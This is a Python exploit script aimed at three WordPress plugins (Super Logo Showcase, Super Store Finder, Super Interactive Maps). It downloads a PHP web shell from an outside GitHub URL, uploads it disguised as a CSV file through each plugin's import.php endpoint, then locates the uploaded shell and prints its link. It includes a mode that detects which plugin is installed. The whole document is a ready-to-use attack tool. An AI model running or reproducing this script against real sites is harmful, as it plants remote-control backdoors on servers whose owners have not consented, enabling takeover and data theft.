import requests as req
import sys
proxies = {}
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}
target_plugins = [["superlogoshowcase-wp", "sls-wp-admin"],
["superstorefinder-wp", "ssf-wp-admin"],
["super-interactive-maps","sim-wp-admin"]]
s = req.Session()
s.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"})
def Exploit(target):
    try:
        print("[!] Getting shell content.")
        shell_content = s.get("https://raw.githubusercontent.com/abbishal/cr3/main/Tup.php")
        print("[!] Uploading shell to the target.")
        r = s.post("{}/pages/import.php".format(target),files={"default_location":("shell.csv.php",shell_content.text.encode(), "text/csv")}, proxies=proxies)
        if r.status_code == 200:
            print("[!] Got response code 200.")
            return
        if r.status_code == 500:
            print("[!] Got response code 500. That's okay.")
            return
        sys.exit("[XXX] Seems not vulnerable.")
    except Exception as e:
        sys.exit("[XXX] {}".format(e))
def Lazy(url):
    for plugin_name, path_admin in target_plugins:
        target = "{}/wp-content/plugins/{}/{}".format(url, plugin_name, path_admin)
        r=s.get(target, proxies=proxies)
        if r.status_code==200:
            print("[!] {} plugin detected.".format(plugin_name))
            return target
    sys.exit("[!] Plugin not found.")
def Main():
    if len(sys.argv) < 2:
        sys.exit("Usage: {} http://google.com/".format(sys.argv[0]))
    target = sys.argv[2]
    banner_pick = """
\033[1;96m __  __ ____  __  __ 
\033[1;96m|  \/  |  _ \ \ \/ /
\033[1;96m| |\/| | |_) | \  /  
\033[1;96m| |  | |  _ <  /  \  
\033[1;96m|_|  |_|_| \_\/_/\_\ 
"""
    print(banner_pick)
    index = sys.argv[1]
    if index == "3":
        target = Lazy(target)
    else:
        try:
            plugin = target_plugins[int(index)]
            target = "{}/wp-content/plugins/{}/{}".format(target, plugin[0], plugin[1])
        except Exception as e:
           sys.exit("[XXX] {}".format(e))
    try:
            Exploit(target)
            print("[!] Finding shell path")
            upload_path1 = "{}/pages/SSF_WP_UPLOADS_PATH/csv/import/shell.csv.php".format(target)
            upload_path2 = "{}/shell.csv.php".format(target)
            r = s.get(upload_path1, proxies=proxies)
            if r.status_code == 200:
                print("[OK] Your shell link {}".format(upload_path1))
            else:
                r = s.get(upload_path2, proxies=proxies)
                if r.status_code == 200:
                    print("[OK] Your shell link {}".format(upload_path2))
                else:
                    sys.exit("[XXX] Shell not found.")
    except Exception as e:
       sys.exit("[XXX] {}".format(e))
if __name__=='__main__':
    Main() 